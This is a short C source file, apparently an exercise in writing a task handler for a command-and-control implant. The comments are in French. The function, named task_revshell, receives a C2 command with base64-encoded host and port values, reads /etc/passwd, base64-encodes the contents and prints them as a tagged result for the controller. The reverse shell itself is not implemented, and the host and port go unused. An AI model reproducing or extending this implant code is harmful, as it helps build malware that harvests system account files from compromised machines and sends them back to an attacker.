#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int task_revshell(char *cmd[]) {
    char *task = cmd[0];
    char *revshell = cmd[1];
    char *UID = cmd[2];
    char *LPORT = cmd[3];
    char *LHOST = cmd[4];
    FILE *fp; //on peut crée un flux et on peut utiliser popen
    char command_entier[1024];
    char buffer[1024]; //stockage temporaire
    char output[8192] = ""; // Stocker la sortie encodée en Base64

    // Construire la commande pour lire le fichier /etc/passwd et l'encoder en Base64
    snprintf(command_entier, sizeof(command_entier), //je stock l'écriture de la commande mais rien n'est lancé
             "/usr/bin/cat /etc/passwd | base64 -w 0");

    // Exécuter la commande avec popen() pour capturer la sortie donc le résultat de la commande effectuer
    fp = popen(command_entier, "r"); //variable stocké et argument

    // Lire la sortie de la commande et l'enregistrer dans 'output'
    //Je met le résultat de la commande et je stock dans le buffer
    //strcat(valeur1,valeur2) il permet de condenser en une fonction du coup le résultat du buffer est dans output
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(output, buffer);  // Concatène chaque ligne au buffer 'output'
    }

    // Afficher le résultat encodé en Base64 au format attendu
    printf("REVSHELL_RESULT,%s,%s\n", UID, output);

    return 0;
}

int main() {
    // Commande reçue du C2 (sans décodage)
    char *cmd[] = { "task", "revshell", "66bce8e71f", "ODA4MA==", "MTI3LjAuMC4x", NULL };
    task_revshell(cmd);
    return 0;
}



